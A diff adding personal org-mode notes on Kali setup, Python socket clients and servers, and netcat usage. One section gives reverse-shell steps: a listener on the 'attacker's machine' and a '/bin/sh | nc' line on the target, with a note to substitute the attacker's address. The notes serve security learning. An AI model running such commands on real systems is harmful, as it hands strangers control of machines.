@@ -1,0 +1,152 @@
+** Installing kali
+#+begin_src bash
+sudo apt update
+apt list --upgradable
+sudo apt upgrade
+sudo apt dist-upgrade
+sudo apt autoremove
+#+end_src
+** Set up py3
+*** init
+Make sure python3 version > 3.7.5
+#+begin_src bash
+  sudo apt-get install python3-venv
+  mkdir bhp
+  cd bhp
+  # create a new virtual-env named venv3
+  python3 -m venv venv3
+  source venv3/bin/activate
+  #Now the  prompt is prefixed with (venv3)
+  # should be in python3
+  python
+#+end_src
+Later on, when you’re ready to exit the environment, use the command deactivate.
+*** use pip
+#+begin_src bash
+  pip search hashcrack
+  pip install lxml
+#+end_src
+Now test the newly installed package
+#+begin_src python
+from lxml import etree
+#+end_src
+** Network
+*** TCP client
+#+begin_src python
+  import socket
+
+  target_host = "www.google.com"
+  target_port = 80
+
+  # create a socket object
+  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  # AF_INET -> use standard IPv4
+  # SOCK_STREAM -> this will be a TCP client
+
+  # connect the client
+  client.connect((target_host,target_port))
+
+  # send some data
+  client.send(b"GET / HTTP/1.1\r\nHost: google.com\r\n\r\n")
+
+  # receive some data
+  response = client.recv(4096)
+
+  print(response.decode())
+  client.close()
+
+#+end_src
+*** UDP client
+#+begin_src python
+  import socket
+
+  target_host = "127.0.0.1"
+  target_port = 9997
+
+  # create a socket object
+  client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+  # send some data
+  client.sendto(b"AAABBBCCC",(target_host,target_port))
+
+  # receive some data
+  data, addr = client.recvfrom(4096)
+
+  print(data.decode())
+  client.close()
+#+end_src
+*** TCP server
+#+begin_src python
+import socket
+import threading
+
+IP = '0.0.0.0'
+PORT = 9998
+
+def main():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((IP, PORT))
+    server.listen(5)
+    print(f'[*] Listening on {IP}:{PORT}')
+
+    while True:
+        client, address = server.accept()
+        print(f'[*] Accepted connection from {address[0]}:{address[1]}')
+        client_handler = threading.Thread(target=handle_client, args=(client,))
+        client_handler.start()
+
+def handle_client(client_socket):
+    with client_socket as sock:
+        request = sock.recv(1024)
+        print(f'[*] Received: {request.decode("utf-8")}')
+        sock.send(b'ACK')
+
+if __name__ == '__main__':
+    main()
+
+    #+end_src
+** Netcat
+*** How to give the attacker a shell (reverse shell)
+Step 1. On attacker's machine: start a server on some ports.
+#+begin_src bash
+nc -nlvp 5555
+#+end_src
+Step 2. On the target machine: give attacker the shell
+#+begin_src bash
+  /bin/sh | nc 127.0.0.1 5555
+  # replace 127.0.0.1 , 5555 with the address and port of attacker
+#+end_src
+*** Chat
+Terminal 1
+#+begin_src bash
+  nc -l -p 1234
+#+end_src
+Terminal 2
+#+begin_src bash
+  nc 127.0.0.1 1234
+#+end_src
+*** Transfer data
+Terminal 1
+#+begin_src bash
+  nc -l -p 1234 >output.txt
+#+end_src
+Terminal 2
+#+begin_src bash
+  echo "aa bb cc" > input.txt
+  nc 127.0.0.1 1234 <input.txt
+#+end_src
+*** Port Scanning
+#+begin_src bash
+  nc -z -v 127.0.0.1 1234         # scan 1 port
+  nc -z -v 127.0.0.1 1234 1235    # scan multiple port
+  nc -z -v 127.0.0.1 1233-1240    # scan a range of ports
+#+end_src
+*** Send HTTP request
+#+begin_src bash
+  printf "GET /nc.1 HTTPs/1.1\r\nHost: www.geeksforgeeks.org\r\n\r\n" | nc www.geeksforgeeks.org 80
+#+end_src
+* End
+
+# Local Variables:
+# org-what-lang-is-for: "bash"
+# End:
